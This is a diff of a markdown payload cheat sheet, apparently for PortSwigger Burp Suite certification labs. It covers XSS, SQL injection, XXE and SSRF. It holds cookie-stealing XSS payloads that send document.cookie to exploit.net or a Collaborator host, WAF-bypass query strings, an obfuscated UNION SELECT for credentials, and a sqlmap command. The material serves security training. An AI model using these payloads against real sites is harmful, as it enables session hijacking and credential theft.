@@ -20,9 +20,12 @@ Maybe we can the acronym BSCP, like OSCP?
 
 ### Cookie Stealers
 
-### Reflected XSS in Search with WAF
->Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload
-<sub>WAF is preventing dangerous search filters and tags!</sub>
+### Reflected XSS in Search with WAF  
+
+>Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload  
+
+<sub>WAF is preventing dangerous search filters and tags!</sub>  
+
 ```JavaScript
 fetch("https://Collaborator.oastify.com/?c=" + btoa(document['cookie']))
 ```
@@ -53,13 +56,17 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 ```
 ![(Deliver reflected xss to steal victim cookie.](deliver-reflected-xss-to-steal-victim-cookie.png)
 
-### Reflected XSS in Search with blocked Tags
->Reflected XSS into HTML context with most tags and attributes blocked Bypass WAF
-<sup>Body and event **'onresize'** is only allowed</sup>
+### Reflected XSS in Search with blocked Tags  
+
+>Reflected XSS into HTML context with most tags and attributes blocked Bypass WAF  
+
+<sup>Body and event **'onresize'** is only allowed</sup>  
+
 ```JavaScript
 ?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
-<sup>Body and event **'onpopstate'** is only allowed</sup>
+<sup>Body and event **'onpopstate'** is only allowed</sup>  
+
 ```JavaScript
 ?search=%22%3E%3Cbody%20onpopstate=print()>
 ```
@@ -68,29 +75,34 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 [Methodology to identify allowed tags and events - PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
 
 #### URL and Base64 online encoders and decoders  
+
 [URL Decode and Encode](https://www.urldecoder.org/)  
 [BASE64 Decode and Encode](https://www.base64encode.org/)    
   
 ### Stored XSS
 
-#### Blog post comment section
+>Blog post comment section  
+
 ```html
 <img src="1" onerror="window.location='http://exploit.net/cookie='+document.cookie">
 ```  
 
-#### Product and Store lookup
+>Product and Store lookup  
+
 ```html
 ?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.net/?'+document.cookie;>
 ```  
 
-#### Stored XSS Blog post
+>Stored XSS Blog post  
+
 ```JavaScript
 <script>
 document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
 </script>
 ```  
 
-#### Fetch API Cookie Stealer in blog comment
+>Fetch API Cookie Stealer in blog comment.  
+
 ```JavaScript
 <script>
 fetch('https://exploit.net', {
@@ -106,6 +118,7 @@ body:document.cookie
 ### Authentication
 
 ### Spoof IP Address
+
 >Identify that the alternate HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
   
 <sub>Change the username parameter to carlos and send the request.</sub>
@@ -290,9 +303,13 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 ## XXE Injection
 
->File upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.
+>File upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.  
 
-<sub>Idnetify XXE in not so obvious parameters or requests by adding the below and URL encode thr **&** symbol.</sub>
+### Identify
+
+>Possible to find XXE attack surface in requests that do not contain any XML.  
+
+<sub>Idnetify XXE in not so obvious parameters or requests by adding the below and URL encode thr **&** symbol.</sub>  
 
 ```xml
 %26entity;
@@ -325,6 +342,8 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 ![Exploiting blind XXE to exfiltrate data usding a mlicious exploit DTD file](blind-xxe-exploit-dtd.png)  
 
+### SQL + XML + HackVector 
+
 >SQL injection with filter bypass via XML encoding may allow extract of sensitive data.  
 
 <sub>Use Burp extension hackvector to obfuscate the payload.</sub>
@@ -332,7 +351,6 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 ```xml
 <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
 ```
-
 
 [PortSwigger Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)  
 
@@ -355,6 +373,10 @@ http://127.1:6566/admin
 
 ```
 
+### XXE + SSRF
+
+>XXE vulnerability to perform an SSRF attack that obtains sensitive data.  
+
 [PortSwigger Lab: Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)  
 
 ```xml
@@ -362,7 +384,9 @@ http://127.1:6566/admin
 
 ```  
 
-### HTML to PDF Exploit
+### HTML to PDF 
+
+>Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).  
 
 [HTML to PDF converters such as wkhtmltopdf exploited to read local file(SSRF)](https://www.sidechannel.blog/en/html-to-pdf-converters-can-i-hack-them/index.html)  
 
